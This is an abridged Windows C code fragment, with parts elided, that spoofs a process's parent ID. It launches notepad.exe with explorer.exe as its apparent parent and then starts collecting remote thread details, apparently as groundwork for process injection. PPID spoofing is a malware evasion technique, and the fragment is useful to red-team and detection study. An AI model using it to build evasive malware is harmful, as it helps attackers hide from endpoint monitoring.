...
BOOL SpoofPPID(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	...
	if (!CreateProcessA(lpPath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&SiEx, &Pi)) {
...
int main() {
	...
	if (!GetRemoteProcessHandle(L"explorer.exe", &dwPPID, &hProcess)) {
	printf("GetRemoteProcessHandle Failed\n");
			return 1;
		}

	printf("The PID of explorer.exe is : %d\n", dwPPID);

	if (!SpoofPPID(hProcess, "notepad.exe", &dwProcessId, &hProcess, &hThread)) {
	printf("SpoofPPID Failed\n");
			return 1;
		}

	printf("Notepad has started\n");

	printf("PPID of notepad is now : %d\n", dwPPID);
	getchar(); 

	

	if (!GetRemoteThreadInfo(dwProcessId, &hThread, &dwProcessId)) {
	printf("GetRemoteThreadInfo Failed\n");
				return 1;
			}
